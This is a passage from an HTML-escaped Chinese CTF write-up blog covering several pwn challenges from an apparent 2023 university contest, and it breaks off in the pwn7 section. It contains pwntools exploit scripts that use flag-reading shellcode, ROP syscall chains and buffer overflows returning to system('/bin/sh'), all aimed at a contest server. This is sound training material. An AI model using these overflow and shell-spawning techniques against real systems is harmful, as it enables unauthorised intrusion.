class=&#34;line&#34;&gt;        mov eax,0x5         #调用号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov eax,0x3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov ecx,ebx;    # ecx = char __user *buf 缓冲区，读出的数据--&amp;gt;也就是读“flag”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov ebx,0x3;    # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov edx,0x120;  #对应字节数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int 0x80;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov eax,0x4;    # eax = sys_write&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mov ebx,0x1;    # ebx = unsigned int fd = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int 0x80;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#x27;&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = b&amp;quot;\x66\x6c\x61\x67&amp;quot; + shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = asm(&amp;#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode+=asm(&amp;#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode+=asm(&amp;#x27;mov eax,0x4;mov ebx,0x1;int 0x80&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = p32(pop_eax)+p32(0xb)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80) + b&amp;quot;cat$flag.txt\x00&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload1 = p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload2 = p32(pop_eax)+p32(0x5)+p32(pop_ebx)+p32(bssaddr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0) + p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(3)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload2 += p32(pop_eax)+p32(0x3)+p32(pop_ebx)+p32(0)+p32(pop_ecx)+p32(bssaddr)+p32(pop_edx)+p32(0x20) + p32(int80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload = shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#print(&amp;quot;length&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#print(len(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#shellcode = b&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = shellcode.ljust(0x60,b&amp;quot;a&amp;quot;) + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&amp;quot;sub esp,0x78;jmp esp&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload = b&amp;quot;a&amp;quot;*0x60 + p32(0)+p32(0xaaaaa) + p64(0) + p32(0xaaa) + p32(jmpesp) + asm(&amp;quot;sub esp,0x78;jmp esp&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload = b&amp;quot;a&amp;quot;*0x60 + p32(0)+p32(0x9999)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recv(0x120)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;pwn4&#34;&gt;&lt;a href=&#34;#pwn4&#34; class=&#34;headerlink&#34; title=&#34;pwn4&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn4&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​		0x68 ebp ret 的栈空间      输入0x80 24字节溢出, 减去4字节ebp的话,还有20字节&lt;/p&gt;
&lt;p&gt;​		只开了NX,那就还是rop吧,这个有system和&amp;#x2F;bin&amp;#x2F;sh、或者直接后门函数..&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;plt 0x8048440 system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x80486C0 binsh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485BD                 public shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485BD shell           proc near&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485BD ; __unwind &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485BD                 push    ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485BE                 mov     ebp, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485C0                 sub     esp, 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485C3                 sub     esp, 0Ch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485C6                 push    offset command  ; &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485CB                 call    _system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D0                 add     esp, 10h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D3                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D4                 leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D5                 retn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D5 ; &amp;#125; // starts at 80485BD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D5 shell           endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:080485D5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		怎么看system的地址呢?,就是push的值不一样,但怎么确定哪个是system呢? (这个是动态链接了!)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605221857581.png&#34; alt=&#34;image-20230605221857581&#34;&gt;&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = process(&amp;#x27;./pwn04&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;101.43.247.245&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9203&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemaddr = &lt;span class=&#34;number&#34;&gt;0x8048440&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = &lt;span class=&#34;number&#34;&gt;0x80486C0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) + p32(systemaddr)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p32(binsh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# sh.sendline(b&amp;#x27;A&amp;#x27; * (0x68+4) + p32(0x80485BD))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;pwn5&#34;&gt;&lt;a href=&#34;#pwn5&#34; class=&#34;headerlink&#34; title=&#34;pwn5&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn5&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;主要是要理解清楚逻辑和内存代码布局就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;signed int sub_80488CE()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v0; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v2; // [esp-Ch] [ebp-24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v3; // [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_804887C();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = sub_8059F50(48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_8048987(v3, 48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = sub_804DBD0(v3 + 16) + 5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v0 == 8 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_8048987(v3, 48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v0 &amp;gt; 8 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v0 == 10 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v0 == 85145 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_804F700(&amp;quot;/bin/sh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v0 == 6 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_804FA00(&amp;quot;where is shell&amp;quot;, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#sh = process(&amp;#x27;./pwn5&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = remote(&amp;quot;101.43.247.245&amp;quot;,9204)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemaddr = 0x8048440&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = 0x80486C0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(sh,&amp;quot;b *0x008048987&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#payload = p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+ p32(0x1234)+p32(0x1234)+p32(0x14c94000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &amp;quot;1234123412341234&amp;quot; + &amp;quot;85140&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;h2 id=&#34;pwn6&#34;&gt;&lt;a href=&#34;#pwn6&#34; class=&#34;headerlink&#34; title=&#34;pwn6&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn6&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;看看又改了啥…&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;signed int sub_80488CE()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v0; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v2; // [esp-Ch] [ebp-24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char *nptr; // [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_804887C();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nptr = (char *)sub_8059F40(48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_8048980(nptr, 48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = atoi_0(nptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v0 == 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_8048980(nptr, 48);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v0 &amp;gt; 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v0 == 3 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v0 == 12345 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_804F6F0(&amp;quot;/bin/sh&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v0 == 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_804F9F0(&amp;quot;where is shell&amp;quot;, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;输入12345即可&lt;/p&gt;
&lt;p&gt;root@hecs-149507:~&amp;#x2F;haida# nc 101.43.247.245 9205&lt;/p&gt;
&lt;p&gt;12345&lt;/p&gt;
&lt;h2 id=&#34;pwn7&#34;&gt;&lt;a href=&#34;#pwn7&#34; class=&#34;headerlink&#34; title=&#34;pwn7&#34;&gt;&lt;/a&gt;&lt;strong&gt;pwn7&lt;/strong&gt;&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int sub_89588B7()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span 